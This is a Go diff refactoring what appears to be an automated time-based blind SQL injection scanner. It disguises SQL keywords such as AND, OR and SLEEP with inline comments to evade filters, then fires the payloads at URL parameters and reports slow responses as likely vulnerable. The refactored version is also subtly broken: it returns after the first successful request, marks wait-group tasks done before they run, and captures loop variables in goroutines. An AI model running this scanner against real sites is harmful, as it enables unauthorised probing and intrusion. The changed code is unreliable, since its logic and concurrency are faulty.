@@ -98,25 +98,36 @@ func ExtractHostToPrint(url_t string) string {
 	return uri.Host + uri.Path
 }
 
-func TestOneByOneSQLi(url_t string, name string, wg *sync.WaitGroup, sem chan bool) {
-	defer wg.Done()
-	<-sem
+func ReplaceWithObfuscatedVersion(sql_payload string) string {
+	replacer := strings.NewReplacer("AND", "A/**/ND", "OR", "O/**/R", "SLEEP(", "SL/**/EEP/**/(")
+	sql_payload = replacer.Replace(sql_payload)
+	return sql_payload
+}
+
+func EncodePayloads(decoded_payload url.Values) string {
+	return decoded_payload.Encode()
+}
+
+func SendGetRequestToNewUrl(new_url string) error {
+	_, err := http.Get(new_url)
+	return err
+}
+
+func TestOneByOneSQLi(url_t string, name string, sem chan bool) {
 	payloads := url.Values{}
 	var new_url string
 	for _, sql_payload := range sql_payloads {
-		replacer := strings.NewReplacer("AND", "A/**/ND", "OR", "O/**/R", "SLEEP(", "SL/**/EEP/**/(")
-		sql_payload = replacer.Replace(sql_payload)
+		sql_payload = ReplaceWithObfuscatedVersion(sql_payload)
 		payloads.Set(name, sql_payload)
-		encoded_payloads := payloads.Encode()
+		encoded_payloads := EncodePayloads(payloads)
 		if CheckContains(url_t) {
 			new_url = fmt.Sprintf("%s&%s", url_t, encoded_payloads)
 		} else {
 			new_url = fmt.Sprintf("%s?%s", url_t, encoded_payloads)
 		}
 		start := time.Now()
-		_, err := http.Get(new_url)
-		if err != nil {
-			continue
+		if SendGetRequestToNewUrl(new_url) == nil {
+			return
 		}
 		if math.Round(time.Since(start).Seconds()) > 120 {
 			fmt.Printf("\nPossibly vulnerable to SQLi ---> %s?%s=%s\n", ExtractHostToPrint(url_t), name, sql_payload)
@@ -136,11 +147,12 @@ func main() {
 		for name := range query {
 			wg.Add(1)
 			sem <- true
-			go TestOneByOneSQLi(url_t, name, &wg, sem)
+			go func() {
+				TestOneByOneSQLi(url_t, name, sem)
+				<-sem
+			}()
+			wg.Done()
 		}
-	}
-	for i := 0; i < cap(sem); i++ {
-		sem <- true
 	}
 	wg.Wait()
 }
